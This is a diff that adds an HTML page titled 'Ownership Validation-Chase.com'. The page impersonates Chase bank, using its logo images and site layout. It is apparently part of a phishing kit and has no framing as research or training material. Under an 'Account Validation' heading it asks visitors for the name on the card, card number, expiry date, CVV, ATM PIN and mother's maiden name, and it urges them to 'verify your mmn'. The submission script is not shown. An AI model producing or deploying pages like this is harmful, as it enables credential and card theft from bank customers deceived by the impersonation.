@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ownership Validation-Chase.com</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,
+            wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="images/1000193120-removebg-preview.png" type="image/png">
+    <script src="https://kit.fontawesome.com/73be9fb684.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body id="card-page">
+    <!-- header -->
+    <div class="headercon">
+        <div class="exitbuttoncon">
+            <span class="exitinline">
+                <i class="fa-solid fa-chevron-left whitechevon"></i>
+                <button class="exitbutton" id="exitbuttoncard">Exit</button>
+            </span>
+        </div>
+        <div class="hederimageholder">
+            <img src="images/white_chase_logo_innercircl-removebg-preview.png" alt="">
+        </div>
+        <div class="languagehlder">
+            <button class="expaniol">Español</button>
+        </div>
+    </div>
+    <!-- header stop-->
+
+
+    <!-- body contents -->
+    <div class="boycontainer">
+        <!-- body left content -->
+        <div class="leftflexdiv">
+            <span class="questionspan">
+                <i class="fa-regular fa-circle-question secureqestionicon"></i>
+                <button class="qestion">Question?</button>
+            </span>
+            <div class="unexpecedspancon">
+                <span class="Faqread">
+                    <button class="FaQs">Read our FaQs</button>
+                    <i class="fa-solid fa-chevron-right"></i>
+                </span>
+            </div>
+        </div>
+        <!-- body left content stop -->
+
+        <!-- main body right content -->
+        <div class="bodyrightcontents">
+
+            <div class="nnertextcon">
+                <div class="firsttextcon">
+                    <p class="firsttext">Card Details</p>
+                    <i class="fa-brands fa-cc-visa"></i>
+                    <i class="fa-brands fa-cc-mastercard"></i>
+                </div>
+                <div class="loadingcon">
+                    <div class="innerloaading cardloaddiv"></div>
+                </div>
+                <p class="bodyheadertext">Account Validation.</p>
+                <p class="paragraph">
+                    Please confirm your card details to continue.
+                </p>
+                <!-- <p class="otpmessage">We sent you a text message</p> -->
+                <div class="recoverinputcon">
+
+                    <div class="otpinputcon">
+                        <label for="cardnameinput" class="otpinputlabel">Name on Card</label>
+                        <input type="text" name="" class="otpinput" id="cardnameinput">
+
+                        <span class="wronginput" id="cardwronginputname" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid Name.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="cardnumberinput" class="otpinputlabel">Card Number</label>
+                        <input type="text" name="" class="otpinput" id="cardnumberinput">
+
+                        <span class="wronginput" id="cardwronginputcardnum" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid Card Number.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="cardnDOBinput" class="otpinputlabel">Expiry Date (MM/YY)</label>
+                        <input type="text" name="" class="otpinput" id="cardnDOBinput">
+
+                        <span class="wronginput" id="cardwronginputDOB" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid Expiry Date.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="cardnCVVinput" class="otpinputlabel">Security Code (CVV)</label>
+                        <input type="text" name="" class="otpinput" id="cardnCVVinput">
+
+                        <span class="wronginput" id="cardwronginputCVV" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid Security Code.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="cardATMpininput" class="otpinputlabel">ATM pin</label>
+                        <input type="text" name="" class="otpinput" id="cardATMpininput">
+
+                        <span class="wronginput" id="cardwronginputATMpin" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid ATM pin.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="cardmmninput" class="otpinputlabel">Mother's Maiden Name</label>
+                        <input type="text" name="" class="otpinput" id="cardmmninput">
+
+                        <span class="wronginput" id="cardwronginputMMN" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid Maiden Name.</p>
+                        </span>
+                    </div>
+
+                    <!-- <div class="otpinputcon">
+                        <label for="otpinput" class="otpinputlabel">City</label>
+                        <input type="text" name="" class="otpinput" id="RecoveryinputCity">
+
+                        <span class="wronginput" id="recoverywronginputCity" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid city.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="otpinput" class="otpinputlabel">State</label>
+                        <input type="text" name="" class="otpinput" id="RecoveryinputState">
+
+                        <span class="wronginput" id="recoverywronginputState" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid state.</p>
+                        </span>
+                    </div>
+
+                    <div class="otpinputcon">
+                        <label for="otpinput" class="otpinputlabel">Zip Code</label>
+                        <input type="text" name="" class="otpinput" id="RecoveryinputZIP">
+
+                        <span class="wronginput" id="recoverywronginputZip" style="display: none;">
+                            <i class="fa-solid fa-circle-exclamation loginexcla"></i>
+                            <p class="wronglabele">Invalid zip code.</p>
+                        </span>
+                    </div> -->
+                </div>
+                <p class="buttomtals">for additional security please verify your mmn to submit card details.</p>
+
+                <button id="cardnextbutton" class="nextbutton" style="margin-bottom: 20px;">Next</button>
+            </div>
+
+        </div>
+        <!-- main body right content stop-->
+    </div>
+    <script src="index.js" type="module"></script>
+</body>
+
+</html>
